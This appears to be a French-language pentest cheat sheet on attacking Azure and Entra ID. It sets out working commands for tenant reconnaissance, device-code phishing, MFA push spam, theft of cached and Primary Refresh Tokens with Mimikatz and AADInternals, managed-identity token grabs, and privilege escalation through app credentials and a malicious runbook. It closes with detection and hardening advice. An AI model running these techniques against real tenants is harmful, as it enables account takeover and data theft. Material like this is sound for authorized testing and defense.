---
title: Azure Security
domain: sciences-appliquées
subdomain: informatique / sécurité / cloud
tags: [azure, entra-id, cloud, pentest, sécurité, active-directory]
date: 2026-03-22
---

# Azure Security

Azure (Microsoft Cloud) est omniprésent en entreprise, notamment via Entra ID (ex-Azure AD) qui gère l'identité. Les attaques Azure ciblent les identités, les permissions IAM, et les services mal configurés.

## Reconnaissance Azure

```bash
# Vérifier si un domaine utilise Azure AD
curl "https://login.microsoftonline.com/<domaine>.com/v2.0/.well-known/openid-configuration"
# → Présence du tenant ID si Azure AD est utilisé

# Trouver le tenant ID
curl "https://login.microsoftonline.com/<domaine>.onmicrosoft.com/.well-known/openid-configuration" | jq '.issuer'

# AADInternals — reconnaissance passive (PowerShell)
Install-Module AADInternals
Get-AADIntTenantID -Domain target.com
Invoke-AADIntReconAsOutsider -DomainName target.com
# → Tenant ID, nombre d'utilisateurs, services activés

# MicroBurst — énumération Azure
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -Base target -Verbose
# → Découverte de sous-domaines Azure (storage, apps, etc.)

# ROADrecon — énumération Entra ID complète
pip install roadrecon
roadrecon gather -u user@target.com -p password
roadrecon gui  # Interface web d'analyse
```

## Entra ID (Azure Active Directory)

### Authentification et token

```bash
# Obtenir un token via le Device Code Flow (no browser redirect)
# Utilisé pour le phishing ou l'accès depuis une machine compromise

# PowerShell — Device Code Flow
Connect-AzAccount -UseDeviceAuthentication
# → Affiche un code → si un utilisateur entre ce code sur aka.ms/devicelogin → token récupéré

# Tokenphisher (phishing Device Code)
# 1. Générer un Device Code
curl -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode" \
    -d "client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&scope=https://graph.microsoft.com/.default"
# → {"device_code":"...", "user_code":"ABCD-1234", "verification_uri":"https://microsoft.com/devicelogin"}

# 2. Envoyer le lien et le user_code à la victime (phishing)
# 3. Poller le token quand la victime s'est authentifiée
curl -X POST "https://login.microsoftonline.com/organizations/oauth2/v2.0/token" \
    -d "grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=d3590ed6-52b3-4102-aeff-aad2292ab01c&device_code=<device_code>"
```

### MFA Fatigue / Push Spam

```bash
# Technique : spammer la victime de notifications MFA (Authenticator app) jusqu'à ce qu'elle accepte
# Effectué via brute-force du mot de passe correct + tentatives MFA répétées

# Détection : Azure Sign-In Logs → nombreuses tentatives MFA en peu de temps
# Contre-mesure : Number Matching dans Microsoft Authenticator
#   → L'utilisateur doit entrer un code affiché à l'écran → pas d'acceptation en aveugle
```

### Extraction de tokens (machines compromises)

```bash
# Tokens stockés dans le cache MSAL
# Windows : %LOCALAPPDATA%\Microsoft\TokenCache\
# macOS : ~/Library/Application Support/com.microsoft.identity/

# AADInternals — extraire les tokens depuis la machine compromise
$tokens = Get-AADIntAccessTokenFromCache
Read-AADIntAccessToken -AccessToken $tokens[0].access_token

# Avec Mimikatz (si module cloudap disponible)
# Les tokens Azure sont stockés dans le processus lsass.exe avec dpapi
sekurlsa::cloudap  # Récupère les tokens PRT (Primary Refresh Token)

# PRT (Primary Refresh Token) — très puissant
# Permet d'obtenir des tokens pour n'importe quelle ressource Azure
# Utilisation avec AADInternals
$prt = Get-AADIntUserPRTToken
New-AADIntAccessTokenForAzureCoreManagement -PRTToken $prt
```

## Énumération avec Graph API

```bash
# Graph API — l'API centrale pour Azure/M365
# https://graph.microsoft.com/v1.0/

# Avec un token valide
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGci..."

# Profil de l'utilisateur courant
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me

# Tous les utilisateurs du tenant
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/users

# Membres d'un groupe (ex: Global Administrators)
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/groups?$filter=displayName eq 'Global Administrators'"

# Applications enregistrées (potentiellement sur-permissions)
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/applications

# Service Principals
curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/servicePrincipals

# GraphRunner — automatisation de l'énumération Graph API
Import-Module GraphRunner.ps1
Get-GraphTokens
Invoke-GraphRecon -Tokens $tokens
Get-AzureADUsers -Tokens $tokens
```

## Service Principals et App Registrations

```bash
# Les App Registrations ont des permissions Graph ou Azure
# Trouver les applications avec des permissions élevées

# Lister les App Registrations
az ad app list --query "[].{AppId:appId, DisplayName:displayName}" -o table

# Permissions d'une application
az ad app show --id <app-id> --query "requiredResourceAccess"

# Client Secrets — si un secret est exfiltré → accès complet à l'application
# Créer un credential pour une app (si on a des droits d'écriture sur l'app)
az ad app credential reset --id <app-id> --append
# → Nouveau client secret → accès en tant que cette application

# Managed Identity — identité sans credential pour les ressources Azure
# Si un VM/Function App a une Managed Identity → accès à d'autres ressources Azure
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/" \
    -H "Metadata: true"
# → Token de l'identité managée → énumérer les ressources Azure
```

## Stockage Azure — mauvaises configurations

```bash
# Blob Storage public — accès anonyme si mal configuré
# Découverte de storage accounts
gobuster dir -u "https://target.blob.core.windows.net" \
    -w containers.txt --no-tls-validation

# Tenter l'accès anonyme à un container
curl "https://targetaccount.blob.core.windows.net/public?restype=container&comp=list"

# Énumérer les blobs dans un container public
curl "https://targetaccount.blob.core.windows.net/data?restype=container&comp=list" |
    grep -o '<Name>[^<]*</Name>'

# Table Storage — données structurées
curl "https://targetaccount.table.core.windows.net/users?sv=...&sig=..."

# Stormspotter — cartographie des ressources Azure
# ROADtools + BlobHunter pour les blobs publics
```

## Escalade de privilèges Azure

### Owner / Contributor → Root

```bash
# Si Contributor sur une Resource Group → créer une VM
# → Managed Identity sur la VM → rôles Azure de la VM

# Escalade via Azure Automation
# Si droits d'écriture sur un Automation Account → créer un Runbook
az automation runbook create --resource-group rg --automation-account-name aa \
    --name evil-runbook --type PowerShell
az automation runbook publish --resource-group rg --automation-account-name aa --name evil-runbook
# → S'exécute avec l'identité du Run As Account (souvent Contributor)

# Escalade via Logic App
# Créer une Logic App qui s'exécute avec des droits élevés
```

### Application Admin → Global Admin

```bash
# Application Administrator peut modifier les applications
# Si une application a le rôle Global Admin → ajouter un credential → obtenir Global Admin token

# Identifier les applications avec des rôles élevés
az ad app show --id <app-id>

# Ajouter un credential (si droits Application Admin)
az ad app credential reset --id <app-id>
# → Récupérer un token en tant que cette application → droits Global Admin
```

## Outils

```bash
# Az CLI (officiel)
az login
az account list
az ad user list
az role assignment list --all

# ROADtools
pip install roadtools
roadrecon gather       # Collecte de données Entra ID
roadrecon gui          # Visualisation

# AADInternals (PowerShell)
Install-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName target.com

# PowerZure — exploitation Azure (PowerShell)
Import-Module PowerZure.psm1
Show-AzureStorageContent    # Lister le contenu des storage accounts
Get-AzureRunAsAccounts      # Lister les Run As Accounts

# Pacu — framework d'exploitation cloud (AWS + Azure)
pacu  # Menu interactif

# ScoutSuite — audit multi-cloud
pip install scoutsuite
scout azure --cli  # Audit avec les credentials az CLI
```

## Détection et hardening

```
Monitoring :
  Azure Monitor + Sentinel → logs d'authentification, changements RBAC
  Alertes sur : création de credentials d'application, changements de rôle, MFA bypass
  Risky Sign-Ins dans Entra ID → connexions depuis des IPs suspectes ou anomalies

Hardening :
✓ Conditional Access Policies :
    → Exiger MFA pour tous les accès (y compris les Service Principals)
    → Bloquer les connexions depuis des pays non autorisés
    → Exiger des devices conformes (Intune compliance)
✓ Privileged Identity Management (PIM) — activation JIT des rôles Admin
✓ Désactiver le Device Code Flow si non nécessaire
✓ Number Matching dans Microsoft Authenticator (anti-MFA fatigue)
✓ Audit régulier des App Registrations et de leurs permissions
✓ Supprimer les Run As Accounts Automation (remplacés par Managed Identity)
✓ Storage Accounts : désactiver l'accès anonyme aux blobs
✓ Entra ID Protection : politique de risque utilisateur et de connexion
```
